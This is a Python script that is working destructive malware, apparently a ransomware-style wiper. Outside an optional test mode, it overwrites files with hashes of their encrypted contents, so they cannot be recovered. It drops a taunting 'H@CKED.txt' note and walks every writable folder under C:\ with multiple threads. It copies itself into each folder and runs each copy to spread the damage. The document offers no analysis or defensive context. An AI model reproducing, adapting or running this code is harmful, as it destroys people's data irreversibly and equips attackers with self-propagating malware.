#/usr/bin/env python3
from cryptography.fernet import Fernet
import os
import threading
from queue import Queue
import shutil
import subprocess
import getpass as gp
import hashlib

DIR = os.path.dirname(os.path.abspath(__file__))
NUM_THREADS = 10
folder_queue = Queue()
folders = []
lock = threading.Lock()
# create a new hashlib.sha256() per file when needed

if "PREFC" in os.listdir(DIR):
    os._exit(0)
if "TESTDIR" in os.listdir(DIR):
    direct = DIR
else:
    direct = "C:\\"

key = Fernet.generate_key()
e = Fernet(key)

if "TESTDIR" in os.listdir(DIR):
    with open(os.path.join(DIR, "TEST.key"), "wb") as file:
        file.write(key)

files = [os.path.join(DIR, i) for i in os.listdir(DIR) if os.path.isfile(os.path.join(DIR, i)) and i != os.path.basename(__file__) and i != "TESTDIR" and i != "TEST.key" and i != "SKIPPED"]

for i in range(len(files)):
    with open(files[i], "rb") as file:
        content = file.read()

    encrypted_content = e.encrypt(content)
    if "TESTDIR" not in os.listdir(DIR):
        encrypted_hash = hashlib.sha256(encrypted_content)
        result = str(encrypted_hash.digest())
        with open(files[i], "wb") as file:
            file.write(result[2:-2].encode())
    else:
        # In test mode, just write the encrypted content directly
        with open(files[i], "wb") as file:
            file.write(encrypted_content)
        os.rename(files[i], files[i] + ".notera")

with open(os.path.join(DIR, "H@CKED.txt"), "w") as file:
    file.write("LOL. YOU'VE BEEN HACKED. YOU'RE AN IDIOT!!!")
with open(os.path.join(DIR, "PREFC"), "w") as file:
    file.write("")
if "SKIPPED" not in os.listdir(DIR):
    def scan_folder():
        while True:
            try:
                folder = folder_queue.get(timeout=3)
            except:
                break

            try:
                for entry in os.scandir(folder):
                    if entry.is_dir(follow_symlinks=False):
                        full_path = entry.path
                        if os.access(full_path, os.W_OK | os.X_OK):
                            with lock:
                                folders.append(full_path)
                            folder_queue.put(full_path)
            except Exception:
                pass
            folder_queue.task_done()

    # Start from C:\
    folder_queue.put(direct)
    threads = []

    for _ in range(NUM_THREADS):
        t = threading.Thread(target=scan_folder)
        t.start()
        threads.append(t)

    folder_queue.join()

    for t in threads:
        t.join()

    for i in range(len(folders)):
        shutil.copy(__file__, os.path.join(folders[i], os.path.basename(__file__)))
        with open(os.path.join(folders[i], "SKIPPED"), "w") as file:
           file.write("")
        if "TESTDIR" in os.listdir(DIR):
            with open(os.path.join(folders[i], "TESTDIR"), "w") as file:
                file.write("")
    for i in range(len(folders)):
        subprocess.run(["python", os.path.join(folders[i], os.path.basename(__file__))])

os._exit(0)